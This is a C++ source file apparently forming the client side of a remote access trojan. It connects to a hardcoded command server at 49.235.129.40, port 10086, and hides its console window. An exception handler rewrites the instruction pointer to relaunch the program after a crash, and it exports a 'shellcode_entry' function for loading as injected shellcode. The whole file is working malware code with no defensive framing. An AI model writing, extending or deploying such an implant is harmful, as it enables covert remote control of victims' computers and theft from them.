#include "Kernel.h"
#include "IOCPClient.h"
#include "Manager.h"
#include "utils.h"

class App{
public:
	static void StartRAT(){
#ifdef _DEBUG
		char szServerAddr[32] = "49.235.129.40";
#else
		char szServerAddr[32] = "49.235.129.40";
#endif
		
		USHORT Port = 10086;

		CManager *pManager = new CManager();
		CIOCPClient *pClient = new CIOCPClient(pManager,
			szServerAddr, Port, TRUE, INFINITE);

		CMsgHandler *pHandler = new CKernel(pManager);
		pManager->Associate(pClient, pHandler);
		pClient->Run();
	}

	static void Restart(){
		TCHAR szFileName[MAX_PATH];
		GetModuleFileName(GetModuleHandle(0), szFileName, MAX_PATH);

		STARTUPINFO si = { sizeof(si) };
		PROCESS_INFORMATION pi = { 0 };

		if (FALSE ==
			CreateProcess(szFileName, 0, 0, 0, 0, 0, 0, 0, &si, &pi)){
			StartRAT();
			return;
		}
		ExitProcess(0);
	}
	static LONG WINAPI TOP_LEVEL_EXCEPTION_FILTER(
		_In_ struct _EXCEPTION_POINTERS *ExceptionInfo
		){
		ExceptionInfo->ContextRecord->Eip = (DWORD)Restart;
		return EXCEPTION_CONTINUE_EXECUTION;
	}

	static void Prepare(){
		ShowWindow(GetConsoleWindow(), SW_HIDE);
		SetUnhandledExceptionFilter(TOP_LEVEL_EXCEPTION_FILTER);
		return;
	}

	App(){
		CIOCPClient::SocketInit();
		Prepare();
		StartRAT();
	}
	~App(){
		CIOCPClient::SocketTerm();
	}
};


#ifdef _DEBUG
int main(){
	CIOCPClient::SocketInit();
	App::StartRAT();
	return 0;
}
#else

void Launch(){
	App theApp;
}

extern "C" __declspec(dllexport) void shellcode_entry(){
	App theApp;
}

#endif